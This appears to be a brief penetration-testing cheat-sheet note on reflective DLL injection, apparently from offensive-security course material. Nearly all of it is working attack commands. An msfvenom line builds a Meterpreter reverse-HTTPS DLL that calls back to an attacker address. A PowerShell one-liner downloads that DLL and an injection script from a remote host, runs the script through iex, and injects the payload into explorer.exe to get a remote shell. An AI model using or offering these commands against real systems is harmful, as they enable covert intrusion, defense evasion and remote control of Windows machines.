>Shellcode (DLL) Generation

```sh
sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 -f dll -o /var/www/html/met.dll
```

>Assumes Invoke-ReflectivePEInjection.ps1 is on the web server

```powershell
$bytes = (New-Object System.Net.WebClient).DownloadData('http://192.168.49.62/shellcodes/rev.dll');
$procid = (Get-Process -Name explorer).Id;(New-Object System.Net.WebClient).DownloadString('http://192.168.49.62/Invoke-ReflectivePEInjection.ps1') | iex ;Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid 
```

More Info:
![[Evasion Techniques and Breaching Defenses#5 3 Reflective DLL Injection]]
